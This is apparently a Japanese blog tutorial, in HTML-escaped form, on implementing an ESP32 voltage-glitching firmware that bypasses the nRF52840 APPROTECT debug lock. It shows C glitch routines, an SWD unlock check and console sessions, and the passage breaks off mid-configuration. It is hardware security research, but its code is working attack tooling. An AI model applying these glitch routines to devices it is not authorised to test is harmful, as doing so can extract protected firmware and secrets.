&lt;p&gt;&lt;a href=&#34;https://github.com/shutingrz/nrf52-glitcher&#34;&gt;https://github.com/shutingrz/nrf52-glitcher&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;このファームウェアのコア部分はAaron Christophel氏の&lt;a href=&#34;https://github.com/atc1441/ESP32_nRF52_SWD&#34;&gt;ESP32 SWD Flasher for nRF52&lt;/a&gt;を流用しています。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;PlatformIOでビルドできるようにしています。コンパイルしてESP32に書き込んでください。
ここでは設計で記載した各機能について、どのような実装を行っているかを簡単に説明します。&lt;/p&gt;
&lt;h2 id=&#34;実装ターゲットのリセット&#34;&gt;実装:「ターゲットのリセット」&lt;/h2&gt;
&lt;p&gt;パワーオンリセットを行うだけなので、ターゲットのVDD OUTに接続されるGPIOを指定しオン、オフすればOKです。&lt;code&gt;digitalWrite()&lt;/code&gt;を使います。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;set_power&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LED&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NRF_POWER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;実装一定時間のスリープとcpu電圧をgndに落とす戻す&#34;&gt;実装:「一定時間のスリープ」と「CPU電圧をGNDに落とす/戻す」&lt;/h2&gt;
&lt;p&gt;今回のグリッチは速度が求められないので、Arduino-IDEでよく使われるような実装方法で十分です。&lt;/p&gt;
&lt;p&gt;スリープには&lt;code&gt;delayMicroseconds()&lt;/code&gt;を使います。
グリッチについては、MOSFETのゲートに接続されるGPIOを指定しオン/オフすればターゲットのDEC4がGNDに落ちたり戻ったりするので、&lt;code&gt;digitalWrite()&lt;/code&gt;を使って実現します。&lt;/p&gt;
&lt;p&gt;以下はグリッチのコードです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;slow_glitch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GLITCHER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HIGH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;delayMicroseconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;digitalWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GLITCHER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LOW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;accordion&#34;&gt;
  &lt;input id=&#34;id-863524971&#34; class=&#34;toggle&#34; type=&#34;checkbox&#34;&gt;
  &lt;label class=&#34;title&#34; for=&#34;id-863524971&#34;&gt;高速なグリッチをしたい場合 &lt;span class=&#34;acc-desc&#34;&gt;（クリックで開閉）&lt;/span&gt;&lt;/label&gt;
  &lt;div class=&#34;content&#34;&gt;
&lt;h3 id=&#34;高速なグリッチをしたい場合&#34;&gt;高速なグリッチをしたい場合&lt;/h3&gt;
&lt;p&gt;今回のnRF52に対するグリッチでは速度は求められませんが、電圧グリッチを行うターゲットによっては、高速なグリッチが求められる場合があります。そのためにESP32を使った高速なグリッチ方法をここに残しておきます。&lt;/p&gt;
&lt;p&gt;GPIOオンオフの&lt;code&gt;digitalWrite()&lt;/code&gt;、スリープの&lt;code&gt;delayMicroseconds()&lt;/code&gt;は速度の観点で非常に遅いです。高速にGPIOをオンオフするためには直接レジスタを触ると良いでしょう。ESP32では&lt;code&gt;GPIO_OUT_W1TS_REG&lt;/code&gt;と&lt;code&gt;GPIO_OUT_W1TC_REG_REF&lt;/code&gt;を操作することで、高速にGPIO0～31をオンオフできます。また、スリープはビジーウェイトを用いることで1usよりも細かい時間を制御できます。&lt;/p&gt;
&lt;p&gt;次のコードは高速なグリッチです。GPIOのオンオフで10ns、ループ1回に25nsを消費するので最低35nsから、25ns刻みでスリープできます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define GPIO_OUT_W1TS_REG_REF *(volatile uint32_t *)GPIO_OUT_W1TS_REG
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define GPIO_OUT_W1TC_REG_REF *(volatile uint32_t *)GPIO_OUT_W1TC_REG
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fast_glitch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// width min 35ns, count+1 = +25ns
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;GPIO_OUT_W1TS_REG_REF&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GLITCHER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;asm&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;volatile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;GPIO_OUT_W1TC_REG_REF&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GLITCHER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;forループは空のコードだとコンパイルの最適化で処理が消えてしまうので、volatileを行うことでforループだけを生成します。&lt;/p&gt;
&lt;p&gt;念のため高速なグリッチをコンパイルしたときのXtensaアセンブリも載せておきます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/volatile_fast_asm.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;標準のグリッチルーチンと異なり、&lt;code&gt;digitalWrite()&lt;/code&gt;や&lt;code&gt;delayMicroseconds()&lt;/code&gt;のような関数呼び出しが一切存在せずこのアセンブリで完結します。またforループもただカウンタの増加だけを行うようなものになっています。&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&#34;実装デバッグ可能か&#34;&gt;実装:「デバッグ可能か」&lt;/h2&gt;
&lt;p&gt;まずSWDの実装を行います。次にSWDの関数を利用して特定の値の状態からデバッグが有効か確認します。以下がルーチンです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;nrf_begin() -&amp;gt; SWDの初期化
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;read_register() -&amp;gt; AHB-APのレジスタを取得
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;nrf_read_lock_state() -&amp;gt; CTRL-APのAPPROTECTSTATUSレジスタ(0xc)を取得し、APPROTECTが有効なら0、無効なら1を返却
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_nrf_unlock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isUnlocked&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_swd_wait_delay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;nrf_begin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;uint32_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;variant_read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;read_register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10000100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;variant_read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00052840&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nrf_read_lock_state&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Serial&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;glitch success!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;isUnlocked&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isUnlocked&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;variant_read&lt;/code&gt;は、AHB-APのレジスタの値が格納されます。&lt;code&gt;0x10000100&lt;/code&gt;は、FICRと呼ばれるコンフィギュレーションレジスタのINFO.PARTレジスタです。nRF52840では値に&lt;code&gt;0x00052840&lt;/code&gt;が格納されています。この値が読めるときはデバッグポート(AHB-AP)にアクセスできているということなので、グリッチが成功したとわかります。
また&lt;code&gt;nrf_read_lock_state()&lt;/code&gt;はコード中コメントのとおり、CTRL-AP上のAPPROTECTの有効状態を取得する関数です。この値からAPPROTECTが無効だった場合も、グリッチが成功したとわかります。&lt;/p&gt;
&lt;h1 id=&#34;グリッチの実践&#34;&gt;グリッチの実践&lt;/h1&gt;
&lt;p&gt;グリッチ回路の結線とグリッチャーのファームウェアの書き込みまで行えば攻撃の準備は完了です。&lt;/p&gt;
&lt;p&gt;グリッチャーのシリアルに接続すると、コンソールが表示されます。&lt;code&gt;nrf&lt;/code&gt;と入力するとnRF52のグリッチモードに移行します（現状このモードしか無い😂）。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ____  _  _  _         _
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; / ___|| |(_)| |_  ___ | |__    ___  _ __
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| |  _ | || || __|/ __|| &amp;#39;_ \  / _ \| &amp;#39;__|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| |_| || || || |_| (__ | | | ||  __/| |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; \____||_||_| \__|\___||_| |_| \___||_|    by @shutingrz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serial terminal usage:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  help               Print this usage
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  nrf                Voltage glitch for nrf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; nrf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;switch nrf mode.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serial terminal usage:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  help               Print this usage
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  set &amp;lt;item&amp;gt; &amp;lt;value&amp;gt; set param
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  exit               exit nrf mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  show               show glitch options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  power &amp;lt;on|off&amp;gt;     Power on or off nRF.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  swd                SWD IDCODE check
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;You can set glitch option value with &amp;#34;set&amp;#34; command.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Params: delay_start, delay_end, width_start, width_end, paranoia_mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;and can get current value with &amp;#34;show&amp;#34; command.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ここで&lt;code&gt;swd&lt;/code&gt;コマンドを実行すれば、グリッチャーがSWDを用いてデバッグポートへのアクセスを試みます。プロテクションがかかっていれば、&lt;code&gt;APPROTECT enabled&lt;/code&gt;というメッセージが表示されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; swd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWD IDCODE: 0x00000064
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UICR device type(0x10000100): 0x00000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;APPROTECT enabled.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWD port locked.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;グリッチャーと回路が正常かどうかを確認したいときは、ターゲットのDongleを初期化しAPPROTECTを無効にしたうえでswdコマンドを実行すると良いでしょう。構成が正常ならプロテクションがかかっていないので、&lt;code&gt;APPROTECT disabled&lt;/code&gt;およびdevice typeの値として&lt;code&gt;0x00052840&lt;/code&gt;が表示されます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;次にグリッチタイミングと長さの設定です。
&lt;code&gt;show&lt;/code&gt;コマンドで、現在のパラメータが表示されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; show
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Glitch options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  delay_start   : 2300
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  width_start   : 0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  delay_end     : 2500
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  width_end     : 10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  paranoia_mode : 0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ここの数値は1us単位です。delay・widthのstartはforループの開始値、endはforループの終了値です。設定は&lt;code&gt;set&lt;/code&gt;コマンドで可能です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; set delay_start 2360
